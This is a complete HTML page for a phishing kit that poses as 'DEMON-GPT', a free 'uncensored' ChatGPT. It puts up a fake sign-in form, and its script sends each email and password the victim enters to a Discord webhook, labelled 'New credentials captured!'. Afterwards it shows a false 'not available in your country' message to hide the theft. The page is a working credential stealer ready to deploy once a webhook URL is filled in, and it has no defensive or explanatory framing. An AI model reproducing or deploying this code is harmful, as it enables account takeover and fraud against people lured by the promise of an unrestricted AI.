<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uncensored GPT</title>
    <style>
        @keyframes flicker {
            0%, 100% { text-shadow: 0 0 7px #ff4800, 0 0 12px #ff4800, 0 0 25px #ff4800, 0 0 50px #ff0000; }
            50% { text-shadow: 0 0 3px #ff4800, 0 0 6px #ff4800, 0 0 12px #ff0000, 0 0 25px #ff0000; }
        }

        :root {
            --background-color: #000000;
            --form-bg-color: rgba(15, 15, 15, 0.9);
            --text-color: #e0e0e0;
            --input-bg-color: #2a0000;
            --input-border-color: #660000;
            --button-bg-color: #c20000;
            --button-hover-color: #ff0000;
            --glow-color: #ff0000;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: var(--background-color);
            background-image: url('https://i.imgur.com/vHqBbyD.jpg'); /* Flame background */
            background-size: cover;
            background-attachment: fixed;
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        #demon-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            z-index: 0;
        }

        .scattered-demon {
            position: absolute;
            pointer-events: none; /* Make them unclickable */
        }

        .container {
            text-align: center;
            background-color: var(--form-bg-color);
            padding: 40px;
            border-radius: 12px;
            border: 1px solid var(--input-border-color);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
            width: 350px;
            z-index: 10; /* Keep this on top of the demons */
        }

        .logo {
            width: 150px;
            height: 150px;
            margin-bottom: 20px;
            border-radius: 50%;
            box-shadow: 0 0 25px var(--glow-color);
        }

        h1, h2 {
            margin: 0 0 25px 0;
            font-size: 24px;
            font-weight: bold;
            color: #ffffff;
            animation: flicker 1.5s infinite alternate;
        }

        p {
            margin-top: -15px;
            margin-bottom: 30px;
            font-size: 16px;
        }

        .input-form input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 6px;
            border: 1px solid var(--input-border-color);
            background-color: var(--input-bg-color);
            color: var(--text-color);
            box-sizing: border-box;
            font-size: 16px;
        }

        .input-form input:focus {
            outline: none;
            border-color: var(--glow-color);
            box-shadow: 0 0 10px var(--glow-color);
        }

        .action-button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background-color: var(--button-bg-color);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s, box-shadow 0.2s;
        }

        .action-button:hover {
            background-color: var(--button-hover-color);
            box-shadow: 0 0 15px var(--button-hover-color);
        }

        #final-message {
            display: none;
            font-size: 18px;
            padding: 20px 0;
        }

        /* Hide sections by default */
        #login-container, #final-message {
            display: none;
        }
    </style>
</head>
<body>
    <div id="demon-container"></div>

    <div class="container" id="welcome-container">
        <img class="logo" src="https://i.imgur.com/3gX3Ff4.png" alt="Demon AI Icon">
        <h1>DEMON-GPT</h1>
        <p>Your uncensored AI version of ChatGPT for free.</p>
        <button class="action-button" onclick="showLogin()">NEXT</button>
    </div>

    <div class="container" id="login-container">
        <h2>Sign in to continue</h2>
        <form class="input-form" onsubmit="submitForm(event)">
            <input type="email" id="email" placeholder="Email" required autocomplete="email">
            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
            <button class="action-button" type="submit">PROCEED</button>
        </form>
    </div>

    <div class="container" id="final-message">
        <h2>Access Denied</h2>
        <p>This application is not available in your country.</p>
    </div>

    <script>
        // --- CONFIGURATION ---
        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";

        function showLogin() {
            document.getElementById('welcome-container').style.display = 'none';
            document.getElementById('login-container').style.display = 'block';
        }

        function submitForm(event) {
            event.preventDefault(); // Prevent the form from reloading the page
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const payload = {
                content: `🔥 New credentials captured! 🔥\n**Email:** ${email}\n**Password:** ${password}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .catch(error => console.error('Error sending to webhook:', error))
            .finally(() => {
                // Always show the final message, regardless of webhook success
                document.getElementById('login-container').style.display = 'none';
                document.getElementById('final-message').style.display = 'block';
            });
        }
        
        function scatterDemons() {
            const container = document.getElementById('demon-container');
            const demonImageUrl = 'https://i.imgur.com/sC4tWnA.png'; // A simple demon head silhouette
            const numDemons = 25; // How many demons to scatter

            for (let i = 0; i < numDemons; i++) {
                const demon = document.createElement('img');
                demon.src = demonImageUrl;
                demon.className = 'scattered-demon';
                
                // Randomize position, size, opacity, and rotation
                const size = Math.random() * 60 + 20; // Size between 20px and 80px
                demon.style.width = `${size}px`;
                demon.style.height = `${size}px`;
                demon.style.top = `${Math.random() * 100}vh`;
                demon.style.left = `${Math.random() * 100}vw`;
                demon.style.opacity = Math.random() * 0.2 + 0.05; // Faint opacity between 0.05 and 0.25
                demon.style.transform = `rotate(${Math.random() * 360}deg)`;

                container.appendChild(demon);
            }
        }

        // Show the initial welcome screen and scatter the demons on load
        document.getElementById('welcome-container').style.display = 'block';
        window.onload = scatterDemons;
    </script>
</body>
</html>
